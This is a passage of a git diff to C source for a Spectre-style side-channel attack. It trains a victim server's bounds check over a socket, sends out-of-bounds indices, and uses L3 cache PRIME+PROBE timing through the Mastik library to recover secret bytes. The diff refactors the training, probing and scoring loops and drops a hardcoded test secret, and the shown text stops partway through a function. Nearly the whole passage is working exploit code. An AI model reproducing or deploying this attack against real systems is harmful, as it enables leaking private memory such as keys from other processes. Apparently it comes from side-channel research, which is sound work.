@@ -3,54 +3,46 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
-#include <unistd.h> //close
+#include <unistd.h> 			//close
 
 #include <util.h>
 #include <l3.h>
 #include <low.h>
 
-#include<string.h>    //strlen
-#include<sys/socket.h>    //socket
-#include<arpa/inet.h> //inet_addr
+#include<string.h>   			//strlen
+#include<sys/socket.h>  		//socket
+#include<arpa/inet.h>			//inet_addr
 #include <fcntl.h>
 #include <errno.h>
 
-#include<signal.h> //sig_atomic_t
-
-#include <sched.h> //cpu_set_t
 #include <pthread.h>
 #include <inttypes.h>
 #include <sys/timeb.h>
 
 #include <sys/stat.h>
 
-#define NSETS_SETUP 8192
-
 // Victim Properties
-#define ARRAY1_SIZE 16
-#define VICTIM_IP "127.0.0.1"//"192.168.179.71"//"127.0.0.1"
+#define ARRAY1_SIZE 16 			//Debug
+#define VICTIM_IP "127.0.0.1"
 #define VICTIM_PORT 8888
-// Configurations
-#define SAMPLES 3000
-#define INTERVAL 400000
-#define WINDOW 3000000
 
+// Parameters
+#define SAMPLES 1000			//Number of PRIME+PROBE operations per set
+#define INTERVAL 90000			//CPU Clock cycles between PRIME+PROBE operations
+#define WINDOW 3000000			//CPU Clock cycles of ATTACK and IDLE windows
+#define TOMONITOR 1				//Number of sets to be PRIMEd at the same INTERVAL in parallel
 #define SCORE_THRESHOLD 0.8
-#define GAP_THRESHOLD 0.05
-#define SCORE_LOWBOUND 0
-#define TRIES 5
-#define SWAP_SLICES_THRESHOLD 0.75
-#define SAVE2FILE 0
-#define TOMONITOR 32
-#define OOS_THRESHOLD 0.05
-#define SETUP_SCHED_CHECKS 10
-#define MIN_CMPS 30
-#define MAX_CMPS MIN_CMPS*5
-#define THRESH_FOR_SETUP 0.9
-// Cores
-#define MAIN_CORE 0
-#define PP_CORE 1
+#define SCORE_LOWBOUND 0.55
+#define MAX_CMPS 150
 
+
+
+#define OOS_THRESHOLD 0.05
+#define EXTRASPACE 200
+#define GAP_THRESHOLD 0.05
+#define SWAP_SLICES_THRESHOLD 0.75
+#define MIN_CMPS 30
+#define THRESH_FOR_SETUP 0.9
 // Slices & Macros
 #define NSLICES 4
 #if NSLICES == 4
@@ -67,182 +59,63 @@
 #define DELAY(x) for(volatile int z = 0; z < x; z++);
 
 //socket
-int sock;
-struct sockaddr_in server;
-char tmp[256]   = {0};
-char message[64] = {0};
+int target_sock;
+struct sockaddr_in server_struct;
 
 //Mastik
 l3pp_t l3;
 
-int nsets;
-int nslices;
+int nsets;						//Number of sets
+int nslices;					//Number of slices
 
-uint32_t array2_offset;
-uint32_t array2_slice;
-uint32_t array1_size_rawset;
-uint32_t array1_size_set_synced;
-uint32_t secret_length;
+uint32_t array1_size_set;
+uint32_t attack_length;			//Nubmer of Bytes to attack
 
 char pp_flag = 0;
-volatile int attack_flag = 1;
 char pp_oos_err = 0;
 int pp_samples;
 int pp_interval;
 char pp_run;
 
-int Set_To_Probe = 0;
-int Global_Count = 0;
+volatile int attack_flag = 1;	//ATTACK or IDLE indicator
 
 pthread_mutex_t lock_pp = PTHREAD_MUTEX_INITIALIZER;
 
-uint16_t monitor_res[SAMPLES*TOMONITOR*256] = {0};
-uint64_t monitor_res_times[SAMPLES*TOMONITOR*256] = {0};
-uint64_t monitor_attack_times[SAMPLES*TOMONITOR*256] = {0};
-int monitor_res_indicator[SAMPLES*TOMONITOR*256] = {0};
+uint16_t monitor_res[SAMPLES*TOMONITOR*EXTRASPACE] = {0};
+int monitor_res_indicator[SAMPLES*TOMONITOR*EXTRASPACE] = {0};
+
 
 uint64_t interval = INTERVAL;
 uint64_t window = WINDOW;
 uint64_t samples = SAMPLES;
-uint32_t tomonitor = TOMONITOR; //how much sets monitored together in attack
-uint32_t save2file = SAVE2FILE;
-uint32_t nmonitored = 0; //how much sets are currently monitored
+uint32_t tomonitor = TOMONITOR;
+uint32_t nmonitored = 0;
+
 int * monitoredlines;
+unsigned char * suspected_sets;
 
-size_t malicious_x = 0;
-
-unsigned char actual_secret[] = {205, 254, 103,   3, 123,  64,  53, 224,  57,  32,  22, 249,  20,
-		130, 241,  75, 170,  76,  66, 178,  62, 190, 237,   6, 191, 132,
-		47,  17,  34, 118, 165, 204,  69,  92,  91,  51,  21, 115, 202,
-		144, 166,  40, 236,  31,  59,  12, 247, 199, 139, 231, 138,  27,
-		5,  46,  23,  43,  90,  24,  41, 160, 113, 253, 222,   8, 112,
-		255,  39, 175, 173, 201,  97, 124, 117, 235, 155,  82, 193,  84,
-		127, 242, 163, 218, 135, 184, 232, 153, 212, 159,  30,  73,  54,
-		150,  79,  96,   7, 154,  44,  35,  83, 223, 214,   2, 186, 176,
-		156,  42,  80,  87, 129, 198,  94, 120, 207,  88, 220,  67, 188,
-		238, 142, 213,  15, 131, 251,   4, 228,  61,  89, 195,  33,  52,
-		18, 164, 110, 183, 107, 133, 180, 128, 177, 215,  70, 210, 125,
-		194,  55,  28, 211, 219,  60, 240,  49, 106, 137,  37, 140,  26,
-		151, 122, 152, 114,  81,  86,  72,  77, 171,  74, 111, 250,  11,
-		248, 102, 227, 206,  85,  65,   9, 162, 109,  93,  38, 225, 143,
-		233, 230, 121, 149, 161,  95, 246, 126, 148, 145, 192, 189, 239,
-		244, 141,  45, 169, 217, 146, 119, 197,  36, 100, 134, 181,  99,
-		182, 226,  58,  56, 245, 104,  98,  50, 116,   0,  25, 221,  68,
-		108, 136, 174, 243, 200, 179,  10,  71, 158, 229, 185,  48, 203,
-		252,  78, 208, 168, 101, 209,  16,  13, 234,  14,  19, 105,   1,
-		29, 157, 172, 147, 187, 167, 196, 216,  63};
+size_t malicious_x = 0;			//Attack victim via malicious_x
 
 
-unsigned char suspected_sets[NSETS_SETUP] = {0};
-
-void *primeProbe(void *args);
-
-
-__always_inline void pinToCore(int coreId){
-	printf("no pinning\n");
-	return;
-	int rs;
-	cpu_set_t cpuset;
-	CPU_ZERO(&cpuset);
-	CPU_SET(coreId, &cpuset);
-	rs = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
-	if (rs) {
-		perror("pthread_setaffinity_np");
-		exit(EXIT_FAILURE);
-	}
-}
-
-
-//__always_inline void flush_set(int c){ // c:0-8192
-//	uint8_t res;
-//	int set;
-//	for(int s = 0; s < nslices; s++){
-//		set = array1_size_set_synced;
-//		for(int try = 0; try < 20; try++){
-//			res = l3_probecount_set(l3,set);
-//			if(!res)
-//				break;
-//		}
-//	}
-//}
-
-__always_inline void flush_raw_set(int c){ // c:0-255
+__always_inline int flush_set(int c){ // Flush set for cache
 	uint8_t res;
-	int set;
-	for(int s = 0; s < nslices; s++){
-		set = RAWSET(c) | (s << SLICESBITS); //ben - no multiply, saves time = more line touches
-		for(int try = 0; try < 20; try++){
-			res = l3_probecount_set(l3,set);
-			if(!res)
-				break;
-		}
-	}
+	res = l3_probecount_set(l3,c);
+	return res;
 }
-
-__always_inline void flush_many_raw_sets(int c, int nrawsets){ // c:0-255
-	uint8_t res;
-	int set;
-	for(int i=0; i<nrawsets;i++){
-		for(int s = 0; s < nslices; s++){
-			set = RAWSET(c+i) | (s << SLICESBITS); //ben - no multiply, saves time = more line touches
-			for(int try = 0; try < 20; try++){
-				res = l3_probecount_set(l3,set);
-				if(!res)
-					break;
-			}
-		}
-	}
-}
-
 
 __always_inline void send_to_victim_x(size_t x){
-	//memcpy(message,&x,sizeof(size_t));
-	send(sock , &x , sizeof(size_t) , 0);
+	send(target_sock , &x , sizeof(size_t) , 0);
 }
-
 
 int guard(int n, char * err) { if (n == -1) { perror(err); exit(1); } return n; }
 
-void *primeProbe(void *args){
-	int oos;
-	int samples, interval;
-	char run;
-	pthread_mutex_lock(&lock_pp);
-	pp_oos_err = 0;
-	pthread_mutex_unlock(&lock_pp);
-	while(1){
-		oos = 0;
-		while(1){
-			pthread_mutex_lock(&lock_pp);
-			if(pp_flag){
-				samples = pp_samples;
-				interval = pp_interval;
-				run = pp_run;
-				//				printf("# samples = %d, interval = %d, run = %d\n",samples,interval,run); fflush(stdout);
-				pthread_mutex_unlock(&lock_pp);
-				break;
-			}
-			pthread_mutex_unlock(&lock_pp);
-		}
-		if (run){
-			//			oos = l3_repeatedprobecount_with_indicator_and_times(l3,samples,monitor_res,monitor_res_times,monitor_res_indicator,interval,&attack_flag);
-			oos = l3_repeatedprobecount_with_indicator(l3,samples,monitor_res,monitor_res_indicator,interval,&attack_flag);
-		}
-		pthread_mutex_lock(&lock_pp);
-		pp_oos_err |= (oos >= samples * OOS_THRESHOLD);
-		if(oos >= samples * OOS_THRESHOLD && run)
-			printf("# pp_oos_err = %d / %d\n",oos,samples); fflush(stdout);
-		pp_flag = 0;
-		pthread_mutex_unlock(&lock_pp);
-		if (!run)
-			break;
-	}
-	printf("# waiting for join...\n");
-	return EXIT_SUCCESS;
+
+void* wrap_inline(){
+	return __builtin_return_address(0);
 }
 
+
 void set_pp_params(char run, int samples, int interval){
-	//	debug - printf("# set_pp_params(%d,%d,%d)\n",run,samples,interval); fflush(stdout);
 	pthread_mutex_lock(&lock_pp);
 	pp_run = run;
 	pp_samples = samples;
@@ -252,7 +125,6 @@ void set_pp_params(char run, int samples, int interval){
 }
 
 int get_pp_flag(){
-	//	debug - printf("get_pp_flag\n"); fflush(stdout);
 	char res;
 	pthread_mutex_lock(&lock_pp);
 	res = pp_flag;
@@ -261,13 +133,14 @@ int get_pp_flag(){
 }
 
 int get_pp_oos_err(){
-	//	debug - printf("get_pp_oos_err\n"); fflush(stdout);
 	char res;
 	pthread_mutex_lock(&lock_pp);
 	res = pp_oos_err;
 	pthread_mutex_unlock(&lock_pp);
 	return res;
 }
+
+
 int uint32Input() {
 	char input[64];
 	printf ("> ");
@@ -296,22 +169,117 @@ int uint64Input() {
 	return result;
 }
 
-void scoring(int * num_of_comps, float * scores, int * activity, int * oos, int nmonitored,int samples){
-	int startIdx = 0;
-	//	while(monitor_res_indicator[startIdx]) //skip first "attack"
-	//		startIdx++;
-	//	while(!monitor_res_indicator[startIdx]) //skip first "peacetime"
-	//		startIdx++;
-	//		printf("# startIdx = %d\n",startIdx);
+
+void *receive_signal(void *args){
+	int oos, samples, interval;
+	char run;
+
+
+	pthread_mutex_lock(&lock_pp);
+	pp_oos_err = 0;
+	pthread_mutex_unlock(&lock_pp);
+
+
+	while(1){
+		oos = 0;
+		while(1){
+			pthread_mutex_lock(&lock_pp);
+			if(pp_flag){
+				samples = pp_samples;
+				interval = pp_interval;
+				run = pp_run; //ATTACK start flag
+				pthread_mutex_unlock(&lock_pp);
+				break;
+			}
+			pthread_mutex_unlock(&lock_pp);
+		}
+
+		if (run){
+			//PRIME+PROBE for #SAMPLES operations
+			oos = l3_repeatedprobecount_with_indicator(l3,samples,monitor_res,monitor_res_indicator,interval,&attack_flag);
+		}
+
+
+		pthread_mutex_lock(&lock_pp);
+		pp_oos_err |= (oos >= samples * OOS_THRESHOLD);
+		if(oos >= samples * OOS_THRESHOLD && run)
+			printf("# pp_oos_err = %d / %d\n",oos,samples); fflush(stdout);
+		pp_flag = 0;
+		pthread_mutex_unlock(&lock_pp);
+
+
+		if (!run)
+			break;
+	}
+
+
+	printf("# waiting for join...\n");
+	return EXIT_SUCCESS;
+}
+
+
+void send_signal(size_t x, unsigned char setup_flag){
+	uint64_t s,t;
+	size_t train_x = 0;
+	uint64_t attack_state = 1;
+
+	if(setup_flag!=1) // Setup routine - phase 2 or attack
+		while(get_pp_flag()){ //Until receive_signal ends its PRIME+PROBE
+			s = rdtscp64();
+			t = 0;
+			while(t < window){
+				flush_set(array1_size_set);
+				send_to_victim_x(train_x);
+				flush_set(array1_size_set);
+				send_to_victim_x(train_x);
+				flush_set(array1_size_set);
+
+				if (attack_flag){
+					send_to_victim_x(x);
+				}else{
+					memaccess(&x);
+					send_to_victim_x(x-(train_x & 0x1 ? -1 : 1));
+				}
+				t = rdtscp64() - s;
+			}
+
+			attack_state = (attack_state + 1) & 0x7;	//0-7
+			attack_flag = attack_state & 0x1;			//0-1
+			train_x = (attack_state >> 1) & 0x3;		//0-3 once every two windows
+		}
+	else // Setup routine - phase 1
+		while(get_pp_flag()){ //until pp end
+			s = rdtscp64();
+			t = 0;
+			while(t < window){
+				if (attack_flag){
+					DELAY(166);
+					send_to_victim_x(x);
+				}else{
+					DELAY(166);
+					send_to_victim_x(-1);
+					DELAY(166);
+					send_to_victim_x(-1);
+					memaccess(&x);
+				}
+				t = rdtscp64() - s;
+			}
+			attack_flag = !attack_flag;
+		}
+
+}
+
+
+void scoring(int * num_of_comps_tmp, float * scores_tmp, int * activity, int * oos, int nmonitored,int samples){
+	//Scoring function for the sets that were PROBEd
 	for (int offset = 0; offset < nmonitored; offset++){
 		uint32_t attack_misses = 0;
-		uint32_t peacetime_misses = 0;
+		uint32_t idle_misses = 0;
 		uint32_t attack_len = 0;
-		uint32_t peacetime_len = 0;
+		uint32_t idle_len = 0;
 
-		//		unsigned char c = (monitoredlines[offset]*4-array2_offset)/4; //convert set to relevant character;
-		num_of_comps[offset] = 0;
-		for(int i = startIdx+offset; i < samples*nmonitored; i+=nmonitored){
+		num_of_comps_tmp[offset] = 0;
+		for(int i = offset; i < samples*nmonitored; i+=nmonitored){
 			if(monitor_res[i] == (uint16_t)-1){
 				if (NULL != oos) oos[offset]++;
 				continue;
@@ -321,700 +289,234 @@ void scoring(int * num_of_comps, float * scores, int * activity, int * oos, int 
 			if(monitor_res_indicator[i]){ 		//indicator = attack
 				attack_len++;
 				attack_misses += monitor_res[i];
-			} else { 							//indicator = peacetime
-				peacetime_len++;
-				peacetime_misses += monitor_res[i];
+			} else { 							//indicator = idle
+				idle_len++;
+				idle_misses += monitor_res[i];
 			}
-			if(i > startIdx+offset && monitor_res_indicator[i-nmonitored] == 0 && monitor_res_indicator[i] == 1){ // now we have {attack samples, peacetime samples} time to compare
-				num_of_comps[offset]++;
-				//					printf("# c = %d, attack len = %d, peacetime_len = %d\n",c,attack_len,peacetime_len);
-				float attack_avg = (float)attack_misses / attack_len;
-				float idle_avg = (float)peacetime_misses / peacetime_len;
-				scores[offset] += (attack_avg) > (idle_avg);
-				//					printf("attack_avg  = %f, idle_avg = %f\n",attack_avg,idle_avg);
-				attack_len = 0; peacetime_len = 0; attack_misses = 0; peacetime_misses = 0;
+			if(i > offset && monitor_res_indicator[i-nmonitored] == 0 && monitor_res_indicator[i] == 1){ // now we have {attack samples, idle samples} time to compare
+				num_of_comps_tmp[offset]++;
+				float attack_avg = (float)attack_misses / attack_len;	//ATTACK window average
+				float idle_avg = (float)idle_misses / idle_len;			//IDLE window average
+				scores_tmp[offset] += (attack_avg) > (idle_avg);
+				attack_len = 0; idle_len = 0; attack_misses = 0; idle_misses = 0;
 			}
 		}
-		//			printf("# char = %d\n",c); fflush(stdout);
-		//		scores[offset] = scores[offset] / (num_of_comps[offset]);
-		//			printf("# score = %f\n",scores[c]);
 	}
 }
 
 
-int readMemoryByte(size_t x, unsigned char * value) {
-	uint32_t set;
-	uint64_t s,t;
-	float scores[256] = {0};
-	float scores_tmp[256] = {0};
-	int num_of_comps[256] = {0};
-	int num_of_comps_tmp[256] = {0};
-	//	printf("Secret Index: %d\n",secret_index);
+int find_sets_to_monitor(int set_offset,int potential_sets, int * scouted_sets){
+	//Add up to #tomonitor sets to the PRIME+PROBE operation
+	int count_tmp = 0;
+	int set_start_index=0;
+	for(; set_start_index<potential_sets;set_start_index++){
+		if(suspected_sets[set_start_index]==0){
+			count_tmp++;
+			if((count_tmp-1)/tomonitor==set_offset)
+				break;
+		}
+
+	}
+
+	l3_unmonitorall(l3);
+	count_tmp = 0;
+	for (; count_tmp < tomonitor && set_start_index<potential_sets; set_start_index++){
+		if(suspected_sets[set_start_index]==0){
+			count_tmp++;
+			(*scouted_sets)++;
+			if(potential_sets==256)
+				l3_monitor(l3,set_start_index*4);
+			else
+				l3_monitor(l3,set_start_index);
+		}
+	}
+
+	return l3_getmonitoredset(l3,monitoredlines,nsets);
+}
+
+
+int attack_routine(size_t x, unsigned char * value, int potential_sets, unsigned char setup_flag) {
+
+	float *scores = calloc(potential_sets,sizeof(float));
+	float *scores_tmp = calloc(potential_sets,sizeof(float));
+	int *num_of_comps = calloc(potential_sets,sizeof(int));
+	int *num_of_comps_tmp = calloc(potential_sets,sizeof(int));
+
 
 	char ok = 0;
 
 	while(!ok){
-		//		printf("new round! \n");
-		int scouted_sets = 0;
-		for(int set_offset=0;set_offset<256/tomonitor;set_offset++){
-			int count_tmp = 0;
-			int set_start_index;
 
-			for(set_start_index=0;set_start_index<256;set_start_index++){
-				if(suspected_sets[set_start_index]==0){
-					count_tmp++;
-					if((count_tmp-1)/tomonitor==set_offset)
-						break;
-				}
+		int scouted_sets = 0;			//Number of candidates sets
 
-			}
+		for(int set_offset=0;set_offset<potential_sets/tomonitor;set_offset++){
 
-			l3_unmonitorall(l3);
-			count_tmp = 0;
-			//			printf("batch num %d, starting from index=%d \n", set_offset, set_start_index);
-			for (; count_tmp < tomonitor && set_start_index<256; set_start_index++){
-				if(suspected_sets[set_start_index]==0){
-					count_tmp++;
-					scouted_sets++;
-					l3_monitor(l3,set_start_index*4);
-				}
-			}
+			bzero(scores_tmp,potential_sets*sizeof(float));
+			bzero(num_of_comps_tmp,potential_sets*sizeof(int));
+			nmonitored = find_sets_to_monitor(set_offset,potential_sets, &scouted_sets);
+			if(nmonitored==0) break;
 
-			nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
-			//			printf("nmonitored = %d\n", nmonitored);
-			if(nmonitored==0){
-				break;
-			}
-
-			size_t train_x = 0;
-			uint64_t attack_state = 1;
-			//			int count_send = 0;
-
-			set_pp_params(1,samples,interval);
-
-			while(get_pp_flag()){ //until pp end
-				s = rdtscp64();
-				t = 0;
-				while(t < window){
-					flush_raw_set(array1_size_rawset);
-					//					DELAY(166);
-					send_to_victim_x(train_x);
-					flush_raw_set(array1_size_rawset);
-					//					DELAY(166);
-					send_to_victim_x(train_x);
-					//					DELAY(166);
-					flush_raw_set(array1_size_rawset);
-
-					memaccess(&x);
-					memaccess(&count_send);
-					if (attack_flag){
-						send_to_victim_x(x);
-						//					monitor_attack_times[count_send] = rdtscp64();
-						//						count_send ++;
-					}else{
-						send_to_victim_x(x-(train_x & 0x1 ? -1 : 1));
-					}
-					t = rdtscp64() - s;
-				}
-				attack_state = (attack_state + 1) & 0x7;
-				attack_flag = attack_state & 0x1;
-				train_x = (attack_state >> 1) & 0x3;
-			}
-
-
-			bzero(scores_tmp,256*sizeof(float));
-			bzero(num_of_comps_tmp,256*sizeof(int));
+			set_pp_params(1,samples,interval); 				// receive_signal start
+			send_signal(x,setup_flag);						// send_signal start
 			scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);
 
-			for(int tmpi=0;tmpi<nmonitored;tmpi++){
-				//				printf("score for set %d (%d) : %f / (%d) = %f\n",monitoredlines[tmpi],monitoredlines[tmpi]/4,scores_tmp[tmpi],num_of_comps_tmp[tmpi],scores_tmp[tmpi]/num_of_comps_tmp[tmpi]);
-				scores[monitoredlines[tmpi]/4]+=scores_tmp[tmpi];
-				num_of_comps[monitoredlines[tmpi]/4]+=num_of_comps_tmp[tmpi];
-			}
-
-			if(save2file){}
-
-			l3_unmonitorall(l3);
-
-
-		}
-
-
-		int j,k,i;
-		j = k = -1;
-		for (i = 0; i < 256; i++) {
-			if (j < 0 || scores[i]/num_of_comps[i] >= scores[j]/num_of_comps[j]) {
-				k = j;
-				j = i;
-			} else if (k < 0 || scores[i]/num_of_comps[i] >= scores[k]/num_of_comps[k]) {
-				k = i;
-			}
-		}
-
-
-		printf("1st = %d, score = %f (%d) , 2nd = %d, score = %f (%d) , Gap = %f,sets=%d\n",j,scores[j]/num_of_comps[j],num_of_comps[j],k,scores[k]/num_of_comps[k],num_of_comps[k], (scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]),scouted_sets);
-		int place = 1;
-		unsigned char real_value = actual_secret[(x-malicious_x)%256];
-		for (int tmpi = 0; tmpi < 256; tmpi++){
-			if(scores[tmpi]/num_of_comps[tmpi] > scores[real_value]/num_of_comps[real_value])
-				place++;
-		}
-		printf("Real Set Place = %d with score %.2f (%.2f / %d)\n",place,scores[real_value]/num_of_comps[real_value],scores[real_value],num_of_comps[real_value]);
-		ok = ((scores[j]/num_of_comps[j] > SCORE_THRESHOLD) && ((scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]) > GAP_THRESHOLD)) && num_of_comps[j]>MIN_CMPS;
-		*value = j;
-		if(num_of_comps[j]>MAX_CMPS || scouted_sets==0){
-			break;
-		}
-		if(!ok){
-			for (int tmpi = 0; tmpi < 256; tmpi++) {
-				if(num_of_comps[tmpi] > 0 && scores[tmpi]/num_of_comps[tmpi]<SCORE_LOWBOUND){
-					suspected_sets[tmpi]=1;
-				}
-			}
-		}
-
-	}
-	return (ok ? *value : -1);
-
-
-	//Analyzing the results on-the-fly after each pp
-
-
-
-}
-
-
-
-void* wrap_inline(){
-	return __builtin_return_address(0);
-}
-
-int set_up_array1_readMemoryByte(size_t x, size_t train_x, unsigned char * value) {
-	uint32_t set;
-	uint64_t s,t;
-	float scores[NSETS_SETUP] = {0};
-	float scores_tmp[NSETS_SETUP] = {0};
-	int num_of_comps[NSETS_SETUP] = {0};
-	int num_of_comps_tmp[NSETS_SETUP] = {0};
-	void *a, *b;
-	char cmd [200];
-	char ok = 0;
-
-	while(!ok){
-		//		printf("new round! \n");
-		int scouted_sets = 0;
-		for(int set_offset=0;set_offset<NSETS_SETUP/tomonitor;set_offset++){
-			int count_tmp = 0;
-			int set_start_index;
-			for(set_start_index=0;set_start_index<NSETS_SETUP;set_start_index++){
-				if(suspected_sets[set_start_index]==0){
-					count_tmp++;
-					if((count_tmp-1)/tomonitor==set_offset)
-						break;
-				}
-
-			}
-
-			l3_unmonitorall(l3);
-			count_tmp = 0;
-			for (; count_tmp < tomonitor && set_start_index<NSETS_SETUP; set_start_index++){
-				if(suspected_sets[set_start_index]==0){
-					count_tmp++;
-					scouted_sets++;
-					l3_monitor(l3,set_start_index);
-				}
-			}
-
-			nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
-			//			printf("nmonitored = %d\n", nmonitored);
-			if(nmonitored==0){
-				break;
-			}
-
-			uint64_t attack_state = 1;
-			set_pp_params(1,samples,interval);
-			while(get_pp_flag()){ //until pp end
-				s = rdtscp64();
-				t = 0;
-				while(t < window){
-					a = wrap_inline();
-					if (attack_flag){
-						DELAY(166);
-						send_to_victim_x(x);
-						memaccess(&train_x);
-					}else{
-						DELAY(166);
-						send_to_victim_x(train_x);
-						DELAY(166);
-						send_to_victim_x(train_x);
-						memaccess(&x);
-					}
-					b = wrap_inline();
-					for(void* tmpa = a; tmpa<b;tmpa+=8){
-						memaccess(tmpa);
-					}
-					t = rdtscp64() - s;
-				}
-				attack_flag = !attack_flag;
-			}
-
-
-			bzero(scores_tmp,NSETS_SETUP*sizeof(float));
-			bzero(num_of_comps_tmp,NSETS_SETUP*sizeof(int));
-			scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);
-
-			for(int tmpi=0;tmpi<nmonitored;tmpi++){
-				scores[monitoredlines[tmpi]]+=scores_tmp[tmpi];
-				num_of_comps[monitoredlines[tmpi]]+=num_of_comps_tmp[tmpi];
-			}
-
-			l3_unmonitorall(l3);
-
-
-		}
-
-
-		int j,k,i;
-		j = k = -1;
-		for (i = 0; i < NSETS_SETUP; i++) {
-			if (j < 0 || scores[i]/num_of_comps[i] >= scores[j]/num_of_comps[j]) {
-				k = j;
-				j = i;
-			} else if (k < 0 || scores[i]/num_of_comps[i] >= scores[k]/num_of_comps[k]) {
-				k = i;
-			}
-		}
-		//		printf("1st = %d, score = %f (%d) , 2nd = %d, score = %f (%d) , Gap = %f,sets=%d\n",j,scores[j]/num_of_comps[j],num_of_comps[j],k,scores[k]/num_of_comps[k],num_of_comps[k], (scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]),scouted_sets);
-		ok = ((scores[j]/num_of_comps[j] > SCORE_THRESHOLD) && ((scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]) > GAP_THRESHOLD)) && num_of_comps[j]>MIN_CMPS;
-		*value = j;
-		if(num_of_comps[j]>MAX_CMPS || scouted_sets==0){
-			break;
-		}
-		if(!ok){
-			for (int tmpi = 0; tmpi < NSETS_SETUP; tmpi++) {
-				if(num_of_comps[tmpi] > 0 && scores[tmpi]/num_of_comps[tmpi]<SCORE_LOWBOUND){
-					suspected_sets[tmpi]=1;
-				}
-			}
-		}
-
-	}
-
-	printf("Potential sets for array1[x], array2[array1[x]*256]: \n");
-	for(int tmpi=0;tmpi<NSETS_SETUP;tmpi++){
-		if(scores[tmpi]/num_of_comps[tmpi]>THRESH_FOR_SETUP){
-			printf("set %d, score: %.2f (%d comps)\n",tmpi, scores[tmpi]/num_of_comps[tmpi],num_of_comps[tmpi]);
-		}
-	}
-
-	//	sprintf(cmd,"sudo ./virt_to_phys_user %d %p",getpid(),a);
-	//	system(cmd);
-	//	printf(", instruction a address\n");
-	//
-	//	sprintf(cmd,"sudo ./virt_to_phys_user %d %p",getpid(),b);
-	//	system(cmd);
-	//	printf(", instruction b address\n");
-
-
-	return (ok ? *value : -1);
-}
-
-//int set_up_array1_size_readMemoryByte(size_t x, size_t train_x, int x_set, int array1_size_rawset_to_flush, unsigned char * value) {
-//	uint32_t set;
-//	uint64_t s,t;
-//	printf("x = %lu, train_x=%lu, x_set = %d\n", x,train_x,x_set);
-//	void *a, *b;
-//	char cmd [200];
-//	char ok = 0;
-//	l3_unmonitorall(l3);
-//	l3_monitor(l3,x_set);
-//	nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
-//	printf("monitor=%d, set = %d\n", nmonitored, x_set);
-//
-//	int start_set = (array1_size_rawset_to_flush==-1) ? 0 : array1_size_rawset_to_flush;
-//	int end_set = (array1_size_rawset_to_flush==-1) ? NSETS_SETUP/NSLICES : array1_size_rawset_to_flush+1;
-//	for(int set_to_flush = start_set; set_to_flush<end_set; set_to_flush++){
-//		printf("set_to_flush = %d\n", set_to_flush);
-//		float scores[1] = {0};
-//		float scores_tmp[1] = {0};
-//		int num_of_comps[1] = {0};
-//		int num_of_comps_tmp[1] = {0};
-//
-//
-//		uint64_t attack_state = 1;
-//		set_pp_params(1,samples,interval);
-//		while(get_pp_flag()){ //until pp end
-//			s = rdtscp64();
-//			t = 0;
-//			while(t < window){
-//				a = wrap_inline();
-//				//				flush_raw_set(set_to_flush);
-//				DELAY(166);
-//				send_to_victim_x(train_x);
-//				DELAY(166);
-//				send_to_victim_x(train_x);
-//				if (attack_flag){
-//					flush_raw_set(set_to_flush);
-//					send_to_victim_x(x);
-//				}else{
-//					memaccess(&x);
-//				}
-//				b = wrap_inline();
-//				for(void* tmpa = a; tmpa<b;tmpa+=64){
-//					memaccess(tmpa);
-//				}
-//				t = rdtscp64() - s;
-//			}
-//			attack_flag = !attack_flag;
-//		}
-//
-//		bzero(scores_tmp,1*sizeof(float));
-//		bzero(num_of_comps_tmp,1*sizeof(int));
-//		scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);
-//
-//		for(int tmpi=0;tmpi<nmonitored;tmpi++){
-//			scores[0]+=scores_tmp[tmpi];
-//			num_of_comps[0]+=num_of_comps_tmp[tmpi];
-//		}
-//
-//		printf("1st = %d, score = %f (%d)\n",x_set, scores[0]/num_of_comps[0],num_of_comps[0]);
-//
-//
-//	}
-//
-//	sprintf(cmd,"sudo ./virt_to_phys_user %d %p",getpid(),a);
-//	system(cmd);
-//	printf(", instruction a address\n");
-//
-//	sprintf(cmd,"sudo ./virt_to_phys_user %d %p",getpid(),b);
-//	system(cmd);
-//	printf(", instruction b address\n");
-//
-//	return (ok ? *value : -1);
-//}
-
-int set_up_array1_size_readMemoryByte(size_t x, unsigned char * value) {
-
-	int nrawsets=10;
-	for(array1_size_rawset=0;array1_size_rawset<NSETS_SETUP/NSLICES;array1_size_rawset+=nrawsets){
-		uint32_t set;
-		uint64_t s,t;
-		float scores[256] = {0};
-		float scores_tmp[256] = {0};
-		int num_of_comps[256] = {0};
-		int num_of_comps_tmp[256] = {0};
-		char ok = 0;
-		int scouted_sets = 0;
-
-
-		for(int set_offset=0;set_offset<256/tomonitor;set_offset++){
-			int count_tmp = 0;
-			int set_start_index;
-
-			for(set_start_index=0;set_start_index<256;set_start_index++){
-				if(suspected_sets[set_start_index]==0){
-					count_tmp++;
-					if((count_tmp-1)/tomonitor==set_offset)
-						break;
-				}
-
-			}
-
-			l3_unmonitorall(l3);
-			count_tmp = 0;
-			for (; count_tmp < tomonitor && set_start_index<256; set_start_index++){
-				if(suspected_sets[set_start_index]==0){
-					count_tmp++;
-					scouted_sets++;
-					l3_monitor(l3,set_start_index*4);
-				}
-			}
-
-			nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
-			if(nmonitored==0){
-				break;
-			}
-
-			size_t train_x = 0;
-			uint64_t attack_state = 1;
-			int count_send = 0;
-
-			set_pp_params(1,samples,interval);
-			while(get_pp_flag()){ //until pp end
-				s = rdtscp64();
-				t = 0;
-				while(t < window){
-					flush_many_raw_sets(array1_size_rawset,nrawsets);
-					send_to_victim_x(train_x);
-					flush_many_raw_sets(array1_size_rawset,nrawsets);
-					send_to_victim_x(train_x);
-					flush_many_raw_sets(array1_size_rawset,nrawsets);
-					memaccess(&x);
-					if (attack_flag){
-						send_to_victim_x(x);
-					}else{
-						send_to_victim_x(x-(train_x & 0x1 ? -1 : 1));
-					}
-					t = rdtscp64() - s;
-				}
-				attack_state = (attack_state + 1) & 0x7;
-				attack_flag = attack_state & 0x1;
